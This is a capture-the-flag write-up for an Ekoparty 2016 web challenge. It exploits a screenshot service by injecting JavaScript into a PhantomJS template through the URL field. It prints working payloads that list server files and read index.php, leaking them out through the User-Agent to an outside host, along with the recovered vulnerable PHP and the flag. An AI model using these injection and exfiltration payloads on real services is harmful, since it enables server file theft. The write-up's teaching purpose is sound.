@@ -1,0 +1,189 @@
+# Writeup for the Forensh*t's Ekoparty2016 chall
+
+**Keywords**: PhantomJS, Configuration injection, HTTP
+
+**Category**: Web
+
+**Points**: 400 (+15 first flag)
+
+
+### First part : rec0n
+**Note**: Please go to the second part if you are just interested in the solution.
+
+Nice ! A beautifull web application that allows user to take screenshot of a choosen website :). I love when challenges are well designed like this. 
+
+You just need to send your URL and the application takes a screenshot of the website. You also have an URL that you can send to your friends that shows the screenshot.
+
+How does it works ? Where are the vulnerabiliti(es) ?
+
+The first thing I looked for was the URL generation. 
+
+```http://challurl/cache/sha1(random()).png ```
+
+After some testing it seems random, and only urls from ```r'\w'+```  regex seemed valid (you get an error otherwise). So we have to look somwhere else.
+
+For a moment I had a quite extravagant idea (which of course was wrong) : if the Apache server is misconfigured and PNG extension considered as PHP script, then it would be possible to create a webpage that when screenshoted will produced a PHP payload. If you interested in this technique, have a look at this awesome blog : [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
+
+After a bit of thinking I realised it was unlikly to be an advanced exploit like this (it would require an Apache misconfiguration and a lot of work from me to create a payload). So I decided to understand a bit more how the application works.
+
+So I asked the application to get a screenshot of my website while *grepping* the logs. An interesting thing came out : the website used [PhantomJS](http://phantomjs.org/) to create his screenshots. 
+
+```text
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/534.34 (KHTML,like Gecko) PhantomJS/2.1.0 (development) Safari/534.34 
+```
+
+The first thing we though about was : what about a XSS ? Maybe we could access another website that only the machine running PhantomJS can see ? K71 started to install Beef Framework and during this time I looked at the last parameter that could lead to an exploit : the URL !
+
+After some quick testing it appeared that every time I put a ```'``` in the URL, the screenshot is not taken. Hurrah ! A RCE ! (what I thought at least..). I tested every single payload I had (DNS exfiltration, ICMP exfiltration...) and none where working. 
+
+Then an idea came out : lets validate it is really an RCE. For this we asked for the following URL:
+
+```text
+http://google.com/';echo '1
+```
+
+Should work as expected right ? No response.. Mmmh, maybe not an RCE after all.
+
+Finally the the click ! Maybe it is a PhantomJS configuration injection ? :o
+
+### Second part : 3xploit
+
+PhantomJS is a program that simulate a browser. It is written in Javascript and can be launched using a configuration file. Our suspicion was that the URL was injected in this configuration file before launching PhantomJS.
+
+Lets confirm that it is a PhantomJS configuration injection:
+
+```text
+http://google.com/';//
+```
+
+```';//``` should close the string then comment out the rest of the line. We get a screenshot of google hurrah ! Now lets be a little more tendentious:
+
+```text
+http://hugodelval.com'; page.settings.userAgent = 'Hey there :)'; // d
+```
+
+After grepping the log it appeared that it also worked !
+
+Okay now lets exploit. The next payload is meant to list all the files in the current directory and send them in the user-agent :
+
+```javascript
+var fs = require('fs');
+var userAgent = "";
+var path = ".";
+var list = fs.list(path);
+for(var x=0;x<list.length;x++){
+    userAgent += list[x]+";"
+}
+page.settings.userAgent = userAgent;
+```
+
+Which gives us the URL :
+
+```text
+http://hugodelval.com';var fs = require('fs');var ua="";var p=".";var l=fs.list(p);for(var x=0;x<l.length;x++){ua+=l[x]+";"};page.settings.userAgent=ua; // s
+```
+
+And outputs :
+
+```text
+User-Agent: .;..;cache;captcha;index.php;
+```
+
+Of course we can read index.php ! Here is the payload used, followed by the index.php file :
+
+```text
+http://hugodelval.com';var fs=require('fs');var ua=btoa(fs.read('index.php'));page.settings.userAgent=ua; // s
+```
+
+```php
+// ...
+
+$WORKING_DIR = "/var/www/html/cache/";
+$SHOTS_DIR = "/var/www/html/cache/";
+
+if (isset($_GET['hash'])){
+
+$errormessage = "";
+
+$hash =  $_GET['hash'];
+if(preg_match('/[^a-z0-9]/i', $hash))
+{
+	$errormessage = "Invalid hash";
+} else { 
+	$filename = "./cache/{$hash}.png";
+	if (file_exists($filename)) {
+		echo '<div class="well" id="imghere">';
+		echo "<img width=100%  src='$filename'>";
+	        echo '</div>';
+	} else  {
+		$errormessage = "Hash not found in database";
+	}
+}
+
+if (!empty($errormessage)) {
+        echo '<div class="bs-callout bs-callout-warning">';
+        echo "<p>$errormessage</p>";
+        echo '</div>';
+}
+
+} else { 
+
+# get url
+
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+	if (!empty($_POST['g-recaptcha-response']) && !empty($_POST['url'])) {
+		include 'captcha/autoload.php';
+		$recaptcha = new ReCaptchaReCaptcha('6LeXbAsTAAAAANkXvQdE5Hi2Dhkb5lubXRDRWLv7');
+		$resp = $recaptcha->verify($_POST['g-recaptcha-response'], $_SERVER['REMOTE_ADDR']);
+
+		if ($resp->isSuccess()) {
+			$url = $_POST['url'];
+
+			$template = file_get_contents(".ht24df1f769767e020ac970f1adb75f745.js");
+			$tmpphantom = $WORKING_DIR . sha1(sha1(uniqid(), true)) . ".js";
+			$ssoutputs = $WORKING_DIR . sha1(sha1(uniqid(), true)) . ".png";
+
+			# weak protection
+			//$url = str_replace("'", "'", $url);
+
+			$outputfile = str_replace("%URL%", $url, $template);
+			$outputfile = str_replace("%FILENAME%", $ssoutputs, $outputfile);
+
+			file_put_contents($tmpphantom, $outputfile);
+
+			//system('bash -c "exec /usr/local/bin/gtimeout 10 /usr/local/bin/phantomjs '.$tmpphantom.' > /dev/null 2>&1 &"');
+			system('bash -c "exec timeout 40 /opt/phantomjs-2.1.1-linux-x86_64/bin/phantomjs  '.$tmpphantom.' > /dev/null 2>&1 &"');
+
+			sleep(1);
+		} else {
+			$errormessage = "wrong captcha";
+		}
+	} else {
+		$errormessage = "You must fill the captcha and URL to use.";
+	}
+
+// ...
+
+```
+
+Exactly as intuited there is a JS template file *(.ht24df1f769767e020ac970f1adb75f745.js)* which is formatted with the user input. Let's read it.
+
+```javascript
+var here_it_is_come_and_get_it = "EKO{guess_i_got_what_i_deserved}";
+var page = require('webpage').create();
+
+page.viewportSize = { width: 640, height: 480 };
+page.clipRect = { top: 0, left: 0, width: 640, height: 480 };
+
+var url = '%URL%';
+
+page.open(url, function() {
+  page.render('%FILENAME%');
+  phantom.exit();
+});
+```
+
+Here is our flag. ```EKO{guess_i_got_what_i_deserved}```
+
+Thanks for this really fun challenge !
